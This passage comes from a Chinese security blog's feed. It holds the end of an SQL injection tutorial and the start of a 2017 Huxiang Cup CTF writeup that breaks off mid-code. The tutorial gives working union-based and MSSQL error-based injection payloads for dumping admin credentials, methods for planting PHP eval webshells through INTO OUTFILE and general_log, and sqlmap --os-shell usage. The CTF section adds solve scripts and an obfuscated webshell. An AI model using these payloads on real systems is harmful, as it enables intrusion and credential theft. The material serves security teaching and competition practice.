class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 and exists (select username from admin)  网页正常</span><br></pre></td></tr></table></figure><p>说明存在 username 这个列</p><p><img src="7_3.jpeg" alt></p><h3 id="通过-order-by-判断长度"><a href="#通过-order-by-判断长度" class="headerlink" title="通过 order by 判断长度"></a>通过 order by 判断长度</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 order by 10 网页正常，说明大于等于10</span><br></pre></td></tr></table></figure><p><img src="7_4.jpeg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 order by 11 网页不正常，</span><br><span class="line">说明小于11所以应该为10</span><br></pre></td></tr></table></figure><p><img src="7_5.jpeg" alt></p><h3 id="Union查询-查显错点"><a href="#Union查询-查显错点" class="headerlink" title="Union查询  查显错点"></a>Union查询  查显错点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><p><img src="7_6.jpeg" alt></p><h3 id="爆出-admin-表的数据"><a href="#爆出-admin-表的数据" class="headerlink" title="爆出 admin 表的数据"></a>爆出 admin 表的数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入http://192.168.1.7:800/shownews.asp?id=178 and 1=2 union select 1,username,3,4,5,6,7,8,9,10 from admin</span><br></pre></td></tr></table></figure><p><img src="7_7.jpeg" alt></p><h3 id="用同样的方法步骤可以得出-password-表的数据"><a href="#用同样的方法步骤可以得出-password-表的数据" class="headerlink" title="用同样的方法步骤可以得出 password 表的数据"></a>用同样的方法步骤可以得出 password 表的数据</h3><h2 id="sqlserver-手工注入"><a href="#sqlserver-手工注入" class="headerlink" title="sqlserver 手工注入"></a>sqlserver 手工注入</h2><h3 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and db_name()&gt;0;--</span><br></pre></td></tr></table></figure><h3 id="获取第一个表"><a href="#获取第一个表" class="headerlink" title="获取第一个表"></a>获取第一个表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=0x75);--</span><br></pre></td></tr></table></figure><p>得到第一个表 eims_CasePro</p><h3 id="通过已得到的表获取其他的表"><a href="#通过已得到的表获取其他的表" class="headerlink" title="通过已得到的表获取其他的表"></a>通过已得到的表获取其他的表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=0x75 and name not <span class="keyword">in</span>(<span class="string">'eims_CasePro'</span>));--</span><br></pre></td></tr></table></figure><p>得到表eims_CaseSort</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=0x75 and name not <span class="keyword">in</span> (<span class="string">'eims_CasePro'</span>,<span class="string">'eims_CaseSort'</span>));--</span><br></pre></td></tr></table></figure><p>得到表 eims_Down  其他表的获得方式一样</p><h3 id="获取列"><a href="#获取列" class="headerlink" title="获取列"></a>获取列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.syscolumns <span class="built_in">where</span> id=(select id from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=<span class="string">'U'</span> and name=<span class="string">'eims_User'</span>));--</span><br></pre></td></tr></table></figure><p>得到列 ItemID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.syscolumns <span class="built_in">where</span> id=(select id from Test_EIMS.dbo.sysobjects <span class="built_in">where</span> xtype=<span class="string">'U'</span> and name=<span class="string">'eims_User'</span>) and name not <span class="keyword">in</span> (<span class="string">'ItemID'</span>));--</span><br></pre></td></tr></table></figure><p>得到列 SortID</p><h3 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49and 1&lt;(select top 1 admin_name%2b&apos;:&apos;%2badmin_pass from Test_EIMS.dbo.admin_User);--</span><br></pre></td></tr></table></figure><p>得到值admin:admin</p><h2 id="mysql-写入木马"><a href="#mysql-写入木马" class="headerlink" title="mysql 写入木马"></a>mysql 写入木马</h2><h3 id="取得注入漏洞，手工注入一句话木马"><a href="#取得注入漏洞，手工注入一句话木马" class="headerlink" title="取得注入漏洞，手工注入一句话木马"></a>取得注入漏洞，手工注入一句话木马</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.108/510cms/510cms/news.php?cid=&amp;listid=&amp;newsid=33 and 1=2 union select 1,2,<span class="string">'&lt;?php eval([$_POST[1])?&gt;'</span>,4 into outfile <span class="string">'c:\\wwwroot\\510cms\\510cms\\admin\\zks.php'</span></span><br></pre></td></tr></table></figure><h3 id="穿山甲利用filewriter写入"><a href="#穿山甲利用filewriter写入" class="headerlink" title="穿山甲利用filewriter写入"></a>穿山甲利用filewriter写入</h3><p><img src="9_1.jpeg" alt></p><h3 id="sqlmap-生成注入点-–os-shell"><a href="#sqlmap-生成注入点-–os-shell" class="headerlink" title="sqlmap 生成注入点  –os-shell"></a>sqlmap 生成注入点  –os-shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap. -u <span class="string">"http://192.168.1.108/510cms/510cms/news.php?cid=&amp;listid=&amp;newsid=24"</span> --os-shell</span><br></pre></td></tr></table></figure><p><img src="9_2.jpeg" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成上传点：http://192.168.1.108:80/510cms/tmpuxsbx.php</span><br></pre></td></tr></table></figure><p><img src="9_3.jpeg" alt></p><p>上传 php 一句话木马连接菜刀 </p><h2 id="拿到-phpmysdmin-后台后如何拿到w-ebshell"><a href="#拿到-phpmysdmin-后台后如何拿到w-ebshell" class="headerlink" title="拿到 phpmysdmin 后台后如何拿到w ebshell"></a>拿到 phpmysdmin 后台后如何拿到w ebshell</h2><h3 id="在-my-ini-或者-mysql-cnf-对文件导入导出进行限制"><a href="#在-my-ini-或者-mysql-cnf-对文件导入导出进行限制" class="headerlink" title="在 my.ini 或者 mysql.cnf 对文件导入导出进行限制"></a>在 my.ini 或者 mysql.cnf 对文件导入导出进行限制</h3><h4 id="限制-mysqld-不允许导入-导出"><a href="#限制-mysqld-不允许导入-导出" class="headerlink" title="限制 mysqld 不允许导入 | 导出"></a>限制 mysqld 不允许导入 | 导出</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_prive=null</span><br></pre></td></tr></table></figure><h4 id="限制-mysqld-的导入-导出-只能发生在-tmp-目录下"><a href="#限制-mysqld-的导入-导出-只能发生在-tmp-目录下" class="headerlink" title="限制 mysqld 的导入 | 导出 只能发生在 /tmp/ 目录下"></a>限制 mysqld 的导入 | 导出 只能发生在 /tmp/ 目录下</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv=<span class="string">"/tmp/"</span></span><br></pre></td></tr></table></figure><h4 id="不对-mysqld-的导入-导出做限制"><a href="#不对-mysqld-的导入-导出做限制" class="headerlink" title="不对 mysqld 的导入 | 导出做限制"></a>不对 mysqld 的导入 | 导出做限制</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --secure_file_priv=<span class="string">"/"</span></span><br></pre></td></tr></table></figure><h3 id="不对-mysqld-的导入-导出做限制直接写入一句话"><a href="#不对-mysqld-的导入-导出做限制直接写入一句话" class="headerlink" title="不对 mysqld 的导入 | 导出做限制直接写入一句话"></a>不对 mysqld 的导入 | 导出做限制直接写入一句话</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;php eval($_POST[1]);?&gt;'</span> into outfile <span class="string">'/tmp/html/www/1.php'</span>;</span><br></pre></td></tr></table></figure><h3 id="对-mysqld-的导入-导出做限制"><a href="#对-mysqld-的导入-导出做限制" class="headerlink" title="对 mysqld 的导入 | 导出做限制"></a>对 mysqld 的导入 | 导出做限制</h3><h4 id="先查看-secure-file-priv-设置的路径"><a href="#先查看-secure-file-priv-设置的路径" class="headerlink" title="先查看 secure_file_priv 设置的路径"></a>先查看 secure_file_priv 设置的路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.secure_file_priv;</span><br><span class="line">SHOW VARIABLES LIKE <span class="string">"secure_file_priv"</span></span><br></pre></td></tr></table></figure><h4 id="修改-secure-file-priv-设置的路径"><a href="#修改-secure-file-priv-设置的路径" class="headerlink" title="修改 secure_file_priv 设置的路径"></a>修改 secure_file_priv 设置的路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> global secure_file_priv=<span class="string">'C:/php/WWW/'</span>;</span><br></pre></td></tr></table></figure><h4 id="查看-general-log-file-的路径并修改至网站根目录"><a href="#查看-general-log-file-的路径并修改至网站根目录" class="headerlink" title="查看 general_log_file 的路径并修改至网站根目录"></a>查看 general_log_file 的路径并修改至网站根目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE <span class="string">"%general%"</span></span><br><span class="line">SET global general_log_file=<span class="string">'C:/php/WWW/1.php'</span></span><br><span class="line"><span class="built_in">set</span> global general_log=<span class="string">'on'</span></span><br></pre></td></tr></table></figure><h4 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php @eval($_POST[3123]);?&gt;'</span></span><br></pre></td></tr></table></figure><h4 id="菜刀连接-1-php-即可"><a href="#菜刀连接-1-php-即可" class="headerlink" title="菜刀连接 1.php 即可"></a>菜刀连接 1.php 即可</h4><h3 id="查看mysql关键路径"><a href="#查看mysql关键路径" class="headerlink" title="查看mysql关键路径"></a>查看mysql关键路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show grants <span class="keyword">for</span> <span class="string">''</span>@<span class="string">'%'</span>;  查看 mysql 用户的权限</span><br><span class="line">select @@datadir;      查询读取数据库路径</span><br><span class="line">select @@basedir;      查询 MYSQL 安装路径</span><br></pre></td></tr></table></figure><h2 id="sql-注入防护"><a href="#sql-注入防护" class="headerlink" title="sql 注入防护"></a>sql 注入防护</h2><p>0）、采用 sql 语句预编译和绑定变量，是防御 sql 注入的最佳方法<br>1）、mysql_real_escape_string() 函数来转义特殊的输入字符<br>2）、addcslashes() 函数在指定的字符前添加反斜杠</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入一些归纳&lt;/p&gt;
    
    </summary>
    
    
      <category term="常见漏洞" scheme="http://archimesan.me/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>2017湖湘杯</title>
    <link href="http://archimesan.me/2017/12/15/2017%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
    <id>http://archimesan.me/2017/12/15/2017湖湘杯/</id>
    <published>2017-12-15T01:21:39.000Z</published>
    <updated>2019-03-22T07:03:56.837Z</updated>
    
    <content type="html"><![CDATA[<p>2017湖湘杯网络安全大赛Writeup</p><a id="more"></a><p>复赛为web渗透，反编译，破解，加密&amp;解密 一共15道题。</p><h1 id="Misc100-热身运动"><a href="#Misc100-热身运动" class="headerlink" title="Misc100 热身运动"></a>Misc100 热身运动</h1><p>64 个棋盘格子，每一帧都有不同的头像在一个格子里面，想到六十四进制和 Base64 编码。<br>将头像的格子换成数字，再对应 Base64 编码，最后解密得到 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">25,38,49,33,25,55,44,49,29,5,60,49,13,21,61,38,29,22,57,46,30,23,52</span><br><span class="line">ZmxhZ3sxdF8xNV9mdW5ueX0=</span><br><span class="line">flag&#123;1t_15_funny&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc150-流量分析"><a href="#Misc150-流量分析" class="headerlink" title="Misc150 流量分析"></a>Misc150 流量分析</h1><p>WireShark 打开 pcap 直接导出 flag.zip 打开后是 ce.txt</p><p><img src="misc150.png" alt></p><p>是 RGB 值，写脚本解出 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">x = 887 </span><br><span class="line">y = 111 </span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rgb1 = [****]</span></span><br><span class="line">m=0</span><br><span class="line">file = open(<span class="string">'ce.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(0,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(0,y):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#line = rgb1[(3*m):(3*(m+1))]</span></span><br><span class="line">        m+=1</span><br><span class="line">        rgb = c = file.readline().split(<span class="string">","</span>)</span><br><span class="line">        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))</span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure><p><img src="misc150-flag.png" alt></p><h1 id="Misc200-Encryptor-apk"><a href="#Misc200-Encryptor-apk" class="headerlink" title="Misc200 Encryptor.apk"></a>Misc200 Encryptor.apk</h1><p>分析定位到 EncryptImageActivity 类，可以看到加密函数。</p><p><img src="misc200.png" alt></p><p>异或加密，在重复操作，就是把 flag 丢进去再加密一次，拉出结果文件。</p><p>根据这个将加密后的文件进行解密就可以，还有就是那个 key 是字符 Password 的 md5<br>例如 bash d56a23，key 就是 bash key=[0xd5,0x6a,0x23] 这样分割。</p><p><img src="misc200-flag.png" alt></p><h1 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h1><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/pragyan-ctf-2016/steganography/who-made-me-100" target="_blank" rel="noopener">原题</a></p><h1 id="RE100-Re4newer"><a href="#RE100-Re4newer" class="headerlink" title="RE100 Re4newer"></a>RE100 Re4newer</h1><p>查壳发现有 UPX upx -d 文件名<br>脱掉之后 IDA 分析定位主函数进行逆向，sub_401080</p><p><img src="RE100_1.png" alt></p><p><img src="RE100_2.png" alt></p><p>可以看到，这里可以分成44个两位16进制的数，并且顺序与箭头所指的数的大小有关。</p><p>pyhon脚本如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = [0x45,0x43,0x4E,0x44,0x13,0x4A,0x76,0x59,0x71,0x4B,0x7D,0x51,0x54,0x7D,0x63,0x7D,0x7D,0x5B,0x50,0x11,0x52,0x4F,0x4B,0x51,0x70,0x7D,0x47,0x4E,0x67,0x67,0x70,0x70,0x7D,0x57,0x7D,0x67,0x71,0x51,0x63,0x52,0x5F,0x56,0x13,0x7D]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(11):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> [3,2,1,0]: </span><br><span class="line">       flag += chr( a[i*4+j]^0x22)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="RE200-简单的-android"><a href="#RE200-简单的-android" class="headerlink" title="RE200 简单的 android"></a>RE200 简单的 android</h1><p>将apk格式改成zip解压出来</p><p>使用d2x2jar反汇编拿到源码</p><p><img src="android.png" alt></p><p>使用工具jd-gui查看源码</p><p><img src="android_flag.png" alt></p><p>直接拿到flag。</p><h1 id="RE400pyc-分析"><a href="#RE400pyc-分析" class="headerlink" title="RE400pyc 分析"></a>RE400pyc 分析</h1><p><a href="https://www.anquanke.com/post/id/82649" target="_blank" rel="noopener">XDCTF 原题</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def tobin(b):</span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [128,64,32,16,8,4,2,1]:</span><br><span class="line">    ret+=<span class="string">'1'</span> <span class="keyword">if</span> b&amp;i <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">    <span class="built_in">return</span> ret</span><br><span class="line">def decode3b(s):</span><br><span class="line">    a=s&gt;&gt;16</span><br><span class="line">    b=(s&gt;&gt;8) &amp; 0xFF</span><br><span class="line">    c=s &amp; 0xff</span><br><span class="line">    sa=tobin(a)</span><br><span class="line">    sb=tobin(b)</span><br><span class="line">    sc=tobin(c)</span><br><span class="line">    <span class="built_in">return</span> table[int(sa[2:],2)]+table[int(sb[4:]+sa[:2],2)]+table[int(sc[6:]+sb[:4],2)]+table[int(sc[:6],2)]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; a=open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>)</span><br><span class="line">&gt;&gt;&gt; a=a.read()</span><br><span class="line">&gt;&gt;&gt; s=<span class="string">''</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, len(a), 3):</span><br><span class="line">...     s+=decode3b(int(a[i:i+3].encode(<span class="string">'hex'</span>), 16))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; s</span><br><span class="line"><span class="string">'yedugr1ofbm2o4epQz8i1op2tpkxft1nf344t000000000000000'</span></span><br><span class="line">&gt;&gt;&gt; s=<span class="string">''</span>.join(map(lambda c: table[(table.index(c)+63)%64], s))</span><br><span class="line"><span class="string">'xdctfq0neal1n3doPy7h0no1sojwes0me233s"""""""""""""""'</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">xdctf&#123;0ne-l1n3d_Py7h0n_1s_@wes0me233&#125;</span><br></pre></td></tr></table></figure><h1 id="Web150-random"><a href="#Web150-random" class="headerlink" title="Web150 random"></a>Web150 random</h1><p>访问 .index.php.swp 得到源码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">"*********************"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"please input a rand_num !"</span>;</span><br><span class="line"><span class="keyword">function</span> create_password(<span class="variable">$pw_length</span> =  10)&#123;</span><br><span class="line">    <span class="variable">$randpwd</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$pw_length</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$randpwd</span> .= chr(mt_rand(100, 200));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$randpwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">mt_srand(time());</span><br><span class="line"></span><br><span class="line"><span class="variable">$pwd</span>=create_password();</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$pwd</span>.<span class="string">'||'</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pwd</span> == <span class="variable">$_GET</span>[<span class="string">'pwd'</span>])&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"first"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'userLogin'</span>]==<span class="variable">$_GET</span>[<span class="string">'login'</span>])</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Nice , you get the flag it is "</span>.<span class="variable">$flag</span> ;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'userLogin'</span>]=create_password(32).rand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>是按照时间戳那生成的密码，所以快速的再提交一边密码就好了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import sys</span><br><span class="line">import urllib</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">"utf-8"</span>)</span><br><span class="line">import requests</span><br><span class="line"><span class="built_in">pwd</span> = requests.get(<span class="string">'http://114.215.138.89:10080'</span>).content[-18:-8]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pwd</span></span><br><span class="line">ans1 =  requests.get(<span class="string">'http://114.215.138.89:10080?pwd='</span>+urllib.quote(<span class="built_in">pwd</span>)).content</span><br><span class="line"><span class="built_in">print</span> ans1</span><br></pre></td></tr></table></figure><p><img src="web-150.png" alt></p><h1 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h1><p>简简单单的上传，没有套路。</p><p>文件包含漏洞，直接使用 php://filter 读取 flag.php 即可获得 Base64 编码过后的 flag</p><p><img src="web-200.png" alt></p><p>base64解码得到 flag。</p><p>$flag=”flag{c420fb4054e91944a71ff68f7079b9424e5cba21}”; </p><h1 id="Web300"><a href="#Web300" class="headerlink" title="Web300"></a>Web300</h1><p>过滤了字母、数字和一些符号，需要上传一个 webshell</p><p>找到 <a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">p 牛的文章</a>，提到了一种利用类型转换的 webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">"<span class="variable">$_</span>"</span>; // <span class="variable">$_</span>=<span class="string">'Array'</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">'!'</span>==<span class="string">'@'</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; // A</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; // S</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; // S</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E </span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T</span><br><span class="line"><span 